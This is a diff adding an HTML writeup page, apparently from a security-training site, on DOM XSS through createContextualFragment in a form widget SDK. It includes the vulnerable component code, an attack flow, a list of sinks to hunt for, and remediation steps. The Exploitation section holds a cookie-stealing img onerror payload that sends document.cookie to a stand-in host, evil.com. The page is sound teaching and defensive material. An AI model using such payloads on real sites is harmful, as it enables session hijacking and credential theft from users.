@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DOM XSS via createContextualFragment - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/advanced/level2.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev critical">Critical</span>
+      <span class="writeup-category">DOM XSS &middot; Supply Chain &middot; Widget</span>
+    </div>
+
+    <h1>DOM XSS via createContextualFragment in Widget SDK</h1>
+    <div class="writeup-author">Inspired by <strong>xssdoctor</strong>'s widget supply-chain research &middot; Affects 50+ bug bounty targets</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>A major form widget SDK uses <code>document.createRange().createContextualFragment()</code> to render the "thank you" message after form submission. This DOM API parses HTML and <strong>executes event handlers</strong> like <code>onerror</code>, <code>onload</code>, etc. The message content comes from the form configuration API &mdash; unauthenticated and publicly accessible.</p>
+    </div>
+
+    <h2>The Discovery</h2>
+    <p>While auditing third-party widgets embedded on bug bounty targets, the researcher downloaded the form SDK (606KB minified) and searched for dangerous DOM sinks. The <code>grep</code> output was eye-opening:</p>
+
+    <pre><code>grep -n 'innerHTML\|createContextualFragment\|dangerouslySetInnerHTML' forms-v2.js
+
+Line 5618: this.getWindow().postMessage({...}, "*")
+Line 7146: document.createRange().createContextualFragment(a)
+Line 3200: dangerouslySetInnerHTML:{__html:n}  // 10+ instances</code></pre>
+
+    <p>The most dangerous sink was the <code>createContextualFragment</code> call in the "Py" component &mdash; the thank-you message renderer:</p>
+
+    <pre><code>const Py = ({message: a}) => {
+    const i = useRef(null);
+    useEffect(() => {
+        i.current.innerHTML && (i.current.innerHTML = "");
+        // VULNERABLE: parses AND executes HTML
+        const e = document.createRange().createContextualFragment(a);
+        i.current.appendChild(e);
+    }, [a]);
+    return &lt;div ref={i} className="submitted-message" /&gt;;
+};</code></pre>
+
+    <h2>Why createContextualFragment is Dangerous</h2>
+    <p>Most developers know <code>innerHTML</code> is dangerous. But <code>createContextualFragment</code> is worse in a subtle way: it creates a <strong>DocumentFragment</strong> by parsing HTML, and during the parsing process, event handlers are immediately activated. Even sanitizers that strip <code>&lt;script&gt;</code> tags often miss event handlers processed by this API.</p>
+
+    <p>Key differences from innerHTML:</p>
+    <ul>
+      <li><code>innerHTML</code> on a detached element won't execute scripts (they need to be inserted into DOM via <code>appendChild</code>)</li>
+      <li><code>createContextualFragment</code> executes event handlers <strong>during fragment creation</strong>, before the fragment is even appended to the DOM</li>
+      <li>Custom sanitizers that process the HTML string before passing to <code>createContextualFragment</code> may strip <code>&lt;script&gt;</code> but miss <code>&lt;img onerror&gt;</code> because they don't recognize all event handler attributes</li>
+    </ul>
+
+    <h2>Exploitation</h2>
+
+    <h3>1. Direct DOM XSS (if site passes URL params to config)</h3>
+    <p>Any website that passes URL-controlled data to the <code>inlineMessage</code> config option is vulnerable to reflected DOM XSS:</p>
+
+    <pre><code>&lt;script src="https://js.hsforms.net/forms/v2.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+hbspt.forms.create({
+    portalId: '7168674',
+    formId: '47a51496-1ae7-487c-be98-374ded6b07fe',
+    target: '#form-target',
+    inlineMessage: '&lt;img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie"&gt;',
+    showInlineMessageInitially: true
+});
+&lt;/script&gt;</code></pre>
+
+    <h3>2. Supply Chain XSS (stored via admin panel)</h3>
+    <p>A compromised admin account can modify the form configuration's <code>inlineMessage</code> field. The payload is stored server-side and served to <strong>every website</strong> embedding that form. One compromised form definition = XSS on potentially thousands of sites.</p>
+
+    <h3>3. Additional Sinks Found</h3>
+    <p>Beyond createContextualFragment, 10+ React components use <code>dangerouslySetInnerHTML</code> for rendering form labels, descriptions, footers, consent text, and rich text blocks. All controlled by the form configuration API.</p>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>This is <strong>supply-chain XSS</strong>. The form SDK is loaded on 50+ bug bounty targets including major platforms. A single malicious form configuration propagates XSS to every site embedding it. Impact: cookie theft, session hijacking, credential harvesting, phishing overlays &mdash; all on trusted domains.</p>
+    </div>
+
+    <h2>Confirmed Targets</h2>
+    <p>57 bug bounty targets confirmed to load the vulnerable SDK, including sites handling user credentials, payment information, and PII. The form configuration API is publicly accessible without authentication at predictable URLs.</p>
+
+    <div class="attack-flow">
+      <h4>Attack Flow</h4>
+      <div class="flow-step"><div class="flow-num">1</div><p>Attacker compromises form admin account (phishing, credential stuffing, insider)</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">2</div><p>Modifies <code>inlineMessage</code> to include <code>&lt;img src=x onerror=...&gt;</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">3</div><p>Form config API serves the malicious HTML to all embedding sites</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">4</div><p><code>createContextualFragment()</code> parses and executes the payload on each site</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">5</div><p>XSS fires in the context of each embedding domain &mdash; stealing cookies, sessions, credentials</p></div>
+    </div>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>When hunting for DOM XSS, don't just grep for <code>innerHTML</code>. Search for <code>createContextualFragment</code>, <code>insertAdjacentHTML</code>, <code>document.write</code>, <code>srcdoc</code>, and jQuery's <code>.html()</code>. These are all sinks that parse and execute HTML, but are less commonly checked by sanitizers and security reviews.</p>
+    </div>
+
+    <h2>Remediation</h2>
+    <ul>
+      <li>Replace <code>createContextualFragment</code> with DOMPurify sanitization before DOM insertion</li>
+      <li>Use <code>textContent</code> instead of HTML-parsing APIs for user-visible messages</li>
+      <li>Implement CSP with strict nonce-based script-src on embedding pages</li>
+      <li>Add input validation on the form configuration API to reject HTML event handlers</li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: createContextualFragment XSS &mdash; bypass a sanitizer that strips script tags but misses event handlers processed by this sink.</p>
+      </div>
+      <a href="/labs/advanced/level2.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/prototype-pollution-xss-chain">&larr; Prototype Pollution to XSS</a>
+      <a href="/writeups/cors-wildcard-credential-theft">CORS Wildcard Credential Theft &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
